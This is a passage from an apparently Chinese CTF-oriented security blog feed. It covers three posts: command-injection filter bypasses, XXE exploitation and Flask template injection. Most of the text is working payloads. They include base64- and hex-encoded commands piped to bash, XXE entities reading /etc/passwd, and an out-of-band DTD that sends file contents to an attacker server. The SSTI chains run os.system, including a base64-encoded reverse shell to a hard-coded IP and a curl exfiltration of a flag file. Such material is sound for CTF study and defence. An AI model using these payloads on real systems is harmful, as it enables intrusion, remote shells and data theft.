    <content type="html"><![CDATA[<h3 id="0x-01-命令联合执行"><a href="#0x-01-命令联合执行" class="headerlink" title="0x 01 命令联合执行"></a>0x 01 命令联合执行</h3><p>常用的命令分隔符：</p><ul><li>; </li><li>&amp;&amp; </li><li>|| </li><li>%0a </li><li>%0d </li><li>| (管道符)  </li></ul><h3 id="0x-02-bypass技巧"><a href="#0x-02-bypass技巧" class="headerlink" title="0x 02 bypass技巧"></a>0x 02 bypass技巧</h3><p><strong>空格过滤</strong></p><ul><li>$IFS</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;</li><li>&lt;&gt;</li><li>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</li><li>%20</li><li>%09 </li></ul><p><strong>关键字黑名单绕过</strong></p><ul><li><p>ca\t flag\g.php    反斜线绕过</p></li><li><p>cat fl”ag.php     两个单引号绕过</p></li><li><p>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash    base64编码绕过(引号可以去掉)</p></li><li><p>echo “63617420666C61672E706870” | xxd -r -p | bash    hex编码绕过(引号可以去掉)</p></li><li><p>cat fl[a]g.php    用<code>[]</code>匹配</p></li><li><p>cat fla*    用<code>*</code>匹配任意</p></li><li><p>内联执行</p><p>所谓内联执行，就是将反引号内命令的输出作为另一个命令的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x-03-查看文件内容的常见命令"><a href="#0x-03-查看文件内容的常见命令" class="headerlink" title="0x 03 查看文件内容的常见命令"></a>0x 03 查看文件内容的常见命令</h3><p>参考这篇文章：<a href="https://blog.csdn.net/x7418520/article/details/81064861" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81064861</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat     由第一行开始显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">tac     从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line"></span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line"></span><br><span class="line">head    只显示头几行</span><br><span class="line"></span><br><span class="line">tail    只显示最后几行</span><br><span class="line"></span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line"></span><br><span class="line">tailf   类似于tail -f </span><br><span class="line">cut -b 1 flag      &#x2F;&#x2F;-b 可以逐位读取。</span><br><span class="line">a&#x3D;&#96;expr substr $PATH 1 1&#96;;b&#x3D;fla;c&#x3D;g.php;d&#x3D;ca;e&#x3D;t;$d$e ..$a$b$c;</span><br><span class="line">&#x2F;&#x2F; 利用环境变量来获取&#x2F;： expr substr $PATH 1 1 &#x3D;&gt;&#x2F;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1799.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-命令联合执行&quot;&gt;&lt;a href=&quot;#0x-01-命令联合执行&quot; class=&quot;headerlink&quot; title=&quot;0x 01 命令联合执行&quot;&gt;&lt;/a&gt;0x 01 命令联合执行&lt;/h3&gt;&lt;p&gt;常用的命令分隔符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;; &lt;/li&gt;
      
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="命令执行tricks" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞总结</title>
    <link href="http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-07T07:25:13.000Z</published>
    <updated>2020-04-07T08:38:38.715Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><p><strong>XML基础知识</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><h3 id="XML语法规则如下："><a href="#XML语法规则如下：" class="headerlink" title="XML语法规则如下："></a>XML语法规则如下：</h3><ol><li><strong>所有的XML元素都必须有一个关闭标签</strong></li><li><strong>XML标签对大小写敏感</strong></li><li><strong>XML必须正确嵌套</strong></li><li><strong>XML属性值必须加引号””</strong></li><li><strong>实体引用</strong>（在标签属性，以及对应的位置值可能会出现&lt;&gt;符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如&lt;傅好对应的实体就是lt，&gt;符号对应的实体就是gt）</li><li>在XML中，空格会被保留（案例如：<p>a空格B</p>，这时候a和B之间的空格就会被保留）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &#x2F;&#x2F;xml声明</span><br><span class="line">&lt;!DOCTYPE copyright [        &#x2F;&#x2F;DTD(文档类型定义)</span><br><span class="line">&lt;!ELEMENT note (to,reset,login)&gt;   &#x2F;&#x2F;定义元素</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;url&quot;&gt;        &#x2F;&#x2F;定义外部实体test</span><br><span class="line">]&gt;</span><br><span class="line">&lt;to&gt;</span><br><span class="line">&lt;reset&gt;                    &#x2F;&#x2F;下面为文档元素</span><br><span class="line">  &lt;login&gt;&amp;test;&lt;&#x2F;login&gt;            &#x2F;&#x2F;调用test实体（此步骤不可缺）</span><br><span class="line">  &lt;secret&gt;login&lt;&#x2F;secret&gt;</span><br><span class="line">&lt;&#x2F;reset&gt;</span><br><span class="line">&lt;to&gt;</span><br></pre></td></tr></table></figure><p><strong>XML DTD介绍</strong></p><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>DTD实体介绍</strong></p><ul><li><p>实体定义</p><p>实体是用于定义引用普通文本或者特殊字符的快捷方式的变量</p></li></ul><p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p><p><strong>内部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01b0b455cabdadf651.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p> <strong>外部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01a5b9284363aff87d.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>外部参数实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/E:%5CHexo-Blog%5Csource_posts%5Cxxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%5Ct01755d18a3adf6383c.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容”&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-XML注入产生的原理"><a href="#0x-02-XML注入产生的原理" class="headerlink" title="0x 02 XML注入产生的原理"></a>0x 02 XML注入产生的原理</h3><p>​    XXE漏洞全称XML External Entity  Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="0x-03-常见攻击方法"><a href="#0x-03-常见攻击方法" class="headerlink" title="0x 03 常见攻击方法"></a>0x 03 常见攻击方法</h3><h4 id="3-1-有回显读本地敏感文件-Normal-XXE"><a href="#3-1-有回显读本地敏感文件-Normal-XXE" class="headerlink" title="3.1 有回显读本地敏感文件(Normal XXE)"></a>3.1 有回显读本地敏感文件(Normal XXE)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><p>直接读取php文件会报错，因为php文件里面有&lt;&gt;//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，</p><p>直接利用file协议读取PHP文件，就会产生报错，那么需要base64编码来读取</p></blockquote><h4 id="3-2-无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#3-2-无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="3.2 无回显读取本地敏感文件(Blind OOB XXE)"></a>3.2 无回显读取本地敏感文件(Blind OOB XXE)</h4><ul><li>攻击流程：<ol><li>客户端发送payload 1给web服务器</li><li>web服务器向vps获取恶意DTD，并执行文件读取payload2</li><li>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</li><li>通过VPS获得回显（nc监听端口）</li></ol></li></ul><p>我们选择使用外部DTD，在主机上编写一个dtd文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM “PHP:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd”&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘监听的url+端口&#x2F;?file;’&gt;”&gt;</span><br><span class="line"></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t014afb0a837226463c.png" alt></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”utf-8” ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DDOCTYPE root SYSTEM “dtd文件”&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t0177676f0a5d14e921.png" alt></p><p>我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。</p><h4 id="3-3-HTTP-内网主机探测"><a href="#3-3-HTTP-内网主机探测" class="headerlink" title="3.3 HTTP 内网主机探测"></a>3.3 HTTP 内网主机探测</h4><p>我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie  路由树</span><br><span class="line">&#x2F;etc&#x2F;hosts  linux系统中负责ip地址与域名快速解析的文件</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp  &#x2F;&#x2F;arp表，可以获得内网其他机器的地址</span><br></pre></td></tr></table></figure><p>利用http协议继续访问内网主机或者进行内网主机端口扫描</p><p>最后放一个payload集合：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></p><p>参考资料：</p><blockquote><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://www.anquanke.com/post/id/197423" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197423</a></p><p><a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">https://xz.aliyun.com/t/6887</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;XML基础知识&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XML用于标
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="xxe漏洞" scheme="http://yoursite.com/tags/xxe%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>flask模板注入总结</title>
    <link href="http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-05T15:34:51.000Z</published>
    <updated>2020-05-09T14:08:27.368Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><blockquote><p>参考这篇文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p></blockquote><p>漏洞原理：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p><p>注意：理论上不同机器、不同python版本的payload是不尽相同的。</p><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def test():</span><br><span class="line">    code &#x3D; request.args.get(&#39;id&#39;)</span><br><span class="line">    html &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &#39;&#39;&#39;%(code)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure><p><strong>文件读取/命令执行</strong></p><p>无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类``，再寻找子类，最后找到我们需要用到的相应模块</p><p><strong>几个要用到的魔术方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><h3 id="0x-02-Python2-环境下测试"><a href="#0x-02-Python2-环境下测试" class="headerlink" title="0x 02 Python2 环境下测试"></a>0x 02 Python2 环境下测试</h3><p>测试环境：2.7.12</p><p>①获取类对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br></pre></td></tr></table></figure><p>②寻找基类<code>object</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; requests.__class__.__mro__</span><br><span class="line">(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;request.__class__.__mro__[8]</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</p></blockquote><p>③寻找可用的引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, 等等</span><br></pre></td></tr></table></figure><p>④尝试文件读取</p><p><strong>payload</strong></p><p>发现40的地方存在 <code>&lt;type &#39;file&#39;&gt;</code>，使用file方法可以读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">requests.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405233521992.png" alt></p><p><strong>Payload 2 利用&lt;class ‘warnings.catch_warnings’&gt;</strong></p><p>’catch_warnings’可以进一步构造来执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()   </span><br><span class="line"></span><br><span class="line"># 引用__builtins__和file模块</span><br></pre></td></tr></table></figure><p>⑤命令执行</p><p>寻找包含<code>os</code>模块的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">num &#x3D; 0</span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">76 &lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>前面已经找到了包含<code>os</code>模块的类，先初始化，再引用即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405235926575.png" alt></p><p>这里命令执行没有回显，用popen函数带出结果或者通过反弹shell和利用<code>curl</code>带出</p><p>改造后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>反弹shell方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;)</span><br></pre></td></tr></table></figure><p>curl带出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;x.x.x.x&#x2F;?data&#x3D;$data;&#39;)</span><br></pre></td></tr></table></figure><ul><li>扩展使用</li></ul><p>已知函数名可获取函数信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x&#x3D;1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a&#x3D;x*2</span><br><span class="line">    flag&#x3D;&#39;neko&#39;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line">(None, 2, &#39;neko&#39;)</span><br><span class="line">&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function 